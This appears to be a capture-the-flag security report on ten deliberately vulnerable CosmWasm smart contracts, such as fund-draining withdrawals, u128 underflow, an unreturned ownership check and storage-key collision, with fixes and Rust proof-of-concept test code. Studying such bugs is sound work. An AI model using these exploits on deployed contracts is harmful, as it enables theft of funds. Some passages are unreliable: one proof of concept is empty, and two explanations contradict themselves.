# Sample Report template

## Challenge 01: _Mjolnir_

### Description

The bug occurs in `withdraw`, because `ids` does not
check for duplicates. User can deposit once and
send a withdraw message with their deposit ID repeated
in the array such that the contract is drained.

### Recommendation

The fix should be check `ids` in message for duplicates.

### Proof of concept

See `exploit_withdraw_repeat_ids()` in integration tests.

```rust
// EXPLOIT: unprivileged repeated withdraw
let msg = ExecuteMsg::Withdraw { ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2] };
app.execute_contract(sender, contract_addr.clone(), &msg, &[])
    .unwrap();

```

---

## Challenge 02: _Gungnir_

### Description

The bug occurs in `unstake`, with the use of `u128` for voting power
and overflow check set to false. You can force an underflow to a really
big number for voting power.

```rust
// voting_power is a u128 and Cargo.toml has `overflow_checks=false`.
// Message with unlock_amount < voting_power will overflow the u128,
// allowing voting power exceed staked amount
user.voting_power -= unlock_amount;
```

### Recommendation

The fix should be changing `overflow_checks=true` or changing
u128 to Uint128.

### Proof of concept

Added in Cargo.toml:

```toml
[profile.test]
# bao: we need this for PoC to work in testing environment
overflow-checks = false
```

See `exploit_u128_underflow()` in integration tests. We
deposit and stake 1 token, then underflow with unstake of 2
tokens.

```rust
// EXPLOIT: unstake more than staked and undrflow u128
let msg = ExecuteMsg::Unstake {
    unlock_amount: amount.u128() + 1,
};
app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
    .unwrap();

let msg = QueryMsg::GetVotingPower {
    user: (&UNPRIVILEGED_USER).to_string(),
};
let voting_power: u128 = app
    .wrap()
    .query_wasm_smart(contract_addr.clone(), &msg)
    .unwrap();
// unprivileged user has max voting power with just 1 token
assert_eq!(voting_power, std::u128::MAX);
```

---

## Challenge 03: _Laevateinn_

### Description

Bug occurs in message architecture. Should
always be Strings when passed by user. Validation must happen inside the contract.

```rust
// packages/common/src/proxy.rs
#[cw_serde]
pub enum ExecuteMsg {
    // Bao: These addresses are untrusted...
    RequestFlashLoan { recipient: Addr, msg: Binary },
}
```

### Recommendation

Fix recipient type to String and validate
into address type inside proxy contract.

```rust
// packages/common/src/proxy.rs
#[cw_serde]
pub enum ExecuteMsg {
    RequestFlashLoan { recipient: String, msg: Binary },
}

// contracts/proxy/src/contract.rs
let recipient_addr = deps.api.addr_validate(&recipient)?;
```

### Proof of concept

See `exploit_bad_addr_input()` in proxy integration tests. 

```rust
// EXPLOIT: user can pass in uppercased flash loan address
// This will fail the `recipient == flash_loan_addr` check
// but will allow the proxy to call the flash loan contract directly
let flash_recipient = Addr::unchecked(flash_loan_contract.to_string().to_ascii_uppercase());
app.execute_contract(
    Addr::unchecked(ADMIN),
    proxy_contract.clone(),
    &ExecuteMsg::RequestFlashLoan {
        recipient: flash_recipient,
        msg: to_binary(&FlashLoanExecuteMsg::TransferOwner {
            new_owner: Addr::unchecked(HACKER),
        })
        .unwrap(),
    },
    &[],
)
.unwrap();
```

---

## Challenge 04: _Gram_

### Description

The bug occurs in `burn`, where rounding
is floored.

```rust
 let asset_to_return = shares.multiply_ratio(total_assets, total_supply);

```

User can burn shares to their advantage and skim
rounding errors by sending many small transactions.

### Recommendation

The fix should be round up instead of down in `burn`.

### Proof of concept

```rust
// code goes here
```

---

## Challenge 05: _Draupnir_

### Description

The bug occurs in `accept_owner` where the contract
does not end the flow by returning the error.

```rust
if state.proposed_owner != Some(info.sender.clone()) {
    ContractError::Unauthorized {};
}
```

### Recommendation

The fix should be adding `return` keyword before the
contract error and wrap it with an Err enum.

```rust
if state.proposed_owner != Some(info.sender.clone()) {
    return Err(ContractError::Unauthorized {});
}
```

### Proof of concept

See `exploit_ownership_flow` in integration tests.

```rust
// Ownership transfer
app.execute_contract(
    Addr::unchecked(ADMIN),
    contract_addr.clone(),
    &ExecuteMsg::ProposeNewOwner {
        new_owner: "new_owner".to_string(),
    },
    &[],
)
.unwrap();

// EXPLOIT: Accept ownership with a different account
app.execute_contract(
    Addr::unchecked("NOT_new_owner"),
    contract_addr.clone(),
    &ExecuteMsg::AcceptOwnership {},
    &[],
)
.unwrap();

```

---

## Challenge 06: _Hofund_

### Description

Rejected resolution does not reset the votes for previous candidates.
The attacker can use existing token balance from the previous vote
to win an election with less than 1/3 votes cast for them.

In `resolve_proposal`,

```rust
if balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32)) {
    ...
} else {
    // bao: This path does remove the proposal, but
    // does not reset the token in contract
    PROPOSAL.remove(deps.storage);
    response = response.add_attribute("result", "Failed");
}
```

### Recommendation

Keep track of votes coming in for each proposal. Maintain this
invariant across the contract and re-imburse past voters at
end of election.

```rust
// state.rs
const VOTES_CASTED: Map<Addr, Uint128> = Map::new("votes_casted");

// contract.rs `receive_cw20`
// Only votes done through hooks are counted. Transfer not counted
match from_binary(&cw20_msg.msg) {
    Ok(Cw20HookMsg::CastVote {}) => {
        if config.voting_token != info.sender {
            return Err(ContractError::Unauthorized {});
        }

        if current_proposal
            .timestamp
            .plus_seconds(config.voting_window)
            < env.block.time
        {
            return Err(ContractError::VotingWindowClosed {});
        }

        let sender_addr = deps.api.addr_validate(&cw20_msg.sender)?;
        VOTES_CASTED.save(
            deps.storage,
            sender_addr,
            cw20_msg.amount.clone()
        )?;

        Ok(Response::default()
            .add_attribute("action", "Vote casting")
            .add_attribute("voter", cw20_msg.sender)
            .add_attribute("power", cw20_msg.amount))
    }
    _ => Err(ContractError::InvalidCw20Hook),
}

// contract.rs `resolve_proposal`
if balance.balance >= (vtoken_info.total_supply / Uint128::from(3u32)) {
    ...
} else {
    ...
}

let mut msgs = vec![];
for (voter, amount) in VOTES_CASTED
    .range(deps.storage, None, None, Order::Ascending)
    .map(|item| item.unwrap())
{
    // ... Push CW-20 transfer message to return to user
    // ...  Decrement vote balance
}

Ok(response.add_messages(msgs))
```

There are many non-goal-related issues in this contract, including:

- CW20 token sending through `Transfer` bypasses time check
- CW20 token hook does not fail on non-`CastVote {}` messages
- Balance 1/3 check should round up since Uint128 divsion rounds down by default
- Owner can tamper with elections

### Proof of concept

See `exploit_rejected_resolution` in integration tests.

```rust
// Time passes and proposal is successful with only
// (20_000 / 150_000) ~ 13.3% of votes
app.update_block(|block| {
   block.time = block.time.plus_seconds(VOTING_WINDOW);
});
let res = app
   .execute_contract(
       Addr::unchecked(DICTATOR),
       contract_addr.clone(),
       &ExecuteMsg::ResolveProposal {},
       &[],
   )
   .unwrap();
assert_eq!(res.events[1].attributes[2], attr("result", "Passed"));
// Dictator is now the owner
let config: Config = app
   .wrap()
   .query_wasm_smart(contract_addr, &QueryMsg::Config {})
   .unwrap();
assert_eq!(config.owner, DICTATOR.to_string());
```

---

## Challenge 07: _Tyrfing_

### Description

The bug occurs in `contract.rs` where a storage key is repeated.

```rust
// contract.rs
pub const TOP_DEPOSITOR: Item<Addr> = Item::new("address");

// state.rs
pub const OWNER: Item<Addr> = Item::new("address");
```

The TOP_DEPOSITOR item key collides with the owner key, hence, their reads and writes are to the same item.

The user can use a flash loan pool (or their own funds if sufficient) to become a top depositor, whereby they become the owner because of key collision and subsequently drain all funds as the owner.

### Recommendation

The fix should be to change TOP_DEPOSITOR item's key to
something else. Also it is recommended to keep state variables
in `state.rs` to more easily catch key collision.

### Proof of concept

See `exploit_top_depositor_key_collision()` in integration tests.

```rust
// But another unprivileged user can still become the owner by becoming top depositor
app = mint_tokens(app, UNPRIVILEGED_USER.to_string(), Uint128::from(111u128));
app.execute_contract(
    Addr::unchecked(UNPRIVILEGED_USER),
    addr.clone(),
    &ExecuteMsg::Deposit {},
    &[coin(111u128, DENOM)],
)
.unwrap();
let config: ConfigQueryResponse = app
    .wrap()
    .query_wasm_smart(addr.clone(), &QueryMsg::Config {})
    .unwrap();
assert_eq!(config.owner, Addr::unchecked(UNPRIVILEGED_USER));
assert_eq!(config.threshold, Uint128::from(111u128));
```

---

## Challenge 08: _Gjallarhorn_

### Description

The bug occurs in `exec_accept_trade`, the ask
NFT remains on sale even after the ask owner accepts the trade.
The offer owner can trade their new ask NFT, and once
marketplace contract has approval, the ask owner
can immediately cancel the sale and get their own NFT back.

### Recommendation

The fix should be updating the `SALES` state to remove
the NFT from marketplace if it has been traded, and maintain the `SALES` invariant.

```rust
// in `exec_accept_trade`
TRADES.remove(
    deps.storage,
    (trade.asked_id.clone(), trade.trader.to_string()),
);
// bao: maintain invariant
SALES.remove(deps.storage, trade.asked_id);
```

### Proof of concept

See `exploit_sales_invariant_violation()` in integration tests.

```rust
// - Ask owner accepts a trade offer for their NFT....
// - Wait for offer owner to propose a new trade
// or give marketplace transfer approval...

// EXPLOIT:
// USER1 Cancel Sale and gets their NFT back
//
// Alternative exploit: USER1 offers NFT_VICTIM for NFT1 on sale
// and USER1 can successfully accept their own SALE. Both
// attacks depend on bad SALES invariant
app.execute_contract(
    Addr::unchecked(USER1),
    contract_addr.clone(),
    &ExecuteMsg::CancelSale {
        id: NFT1.to_string(),
    },
    &[],
)
.unwrap();

```

---

## Challenge 09: _Brisingamen_

### Description

The bug is in `update_rewards` with the check below. Invariant
is not updated to set user_index to the new global_index for
existing accounts with 0 staked.
Attacker can create account and withdraw all tokens, then
deposit arbitrary amount to drain rewards pool.

A flash loan can be used to deposit arbitrary amount, claim all rewards,
then withdraw. Or hacker can create multiple accounts depositing 1 token,
emptying it, and move around funds to drain rewards pool.

```rust
if user.staked_amount.is_zero() {
    return;
}
// calculate pending rewards
let reward = (state.global_index - user.user_index) * user.staked_amount;
user.pending_rewards += reward;

// bao: invariant does not get set when existing account has 0 staked
user.user_index = state.global_index;
```

### Recommendation

Remove the zero check from `update_rewards` to fix this bug.

```rust
if user.staked_amount.is_zero() {
    return;
}
```

### Proof of concept

See `exploit_withdraw_invariant_violation()` in integration tests.

```rust
// Create existing account then empty balance....

// Hacker should be entitled to 0 tokens per spec
// but can get much more by abusing `withdraw` flaw.
// Deposits but `user_index` does not get updated on `Deposit {}`
app.execute_contract(
    Addr::unchecked(HACKER),
    contract_addr.clone(),
    &ExecuteMsg::Deposit {},
    &[coin(20_000, DENOM)],
)
.unwrap();
let user_info: UserRewardInfo = app
    .wrap()
    .query_wasm_smart(
        contract_addr.clone(),
        &QueryMsg::User {
            user: HACKER.to_string(),
        },
    )
    .unwrap();
assert_eq!(
    user_info,
    UserRewardInfo {
        // Query uses `update_rewards`
        user_index: Decimal::from_atomics(2u128, 0).unwrap(),
        // But look, pending rewards is messed up
        pending_rewards: Uint128::new(20_000),
        staked_amount: Uint128::new(20_000),
    }
);
```

---

## Challenge 10: _Mistilteinn_

### Description

The bug occurs in `mint` at the query token check:

```rust
 let tokens_response: TokensResponse = deps.querier.query_wasm_smart(
        config.nft_contract.to_string(),
        &Cw721QueryMsg::Tokens::<Empty> {
            owner: info.sender.to_string(),
            start_after: None,
            limit: None,
        },
    )?;
```

With this check, the user can send NFTs out after
minting to bypass the mint cap.

### Recommendation

Instead of querying the NFTs user owns, keep a state
variable of who is minting and how many. Increment mint
counter for user everytime they mint, and use this
to check the mint cap.

### Proof of concept

See `exploit_mint_query_flaw()` in integration tests.

```rust
// User can transfer the 3 NFTs just minted to another wallet
for token in tokens.tokens {
    app.execute_contract(
        Addr::unchecked(USER1),
        nft_contract.clone(),
        &cw721::Cw721ExecuteMsg::TransferNft {
            recipient: USER1_ALT_WALLET.to_string(),
            token_id: token,
        },
        &[],
    )
    .unwrap();
}
// USER1 now can mint even more
for _ in 0..3 {
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[],
    )
    .unwrap();
}
```
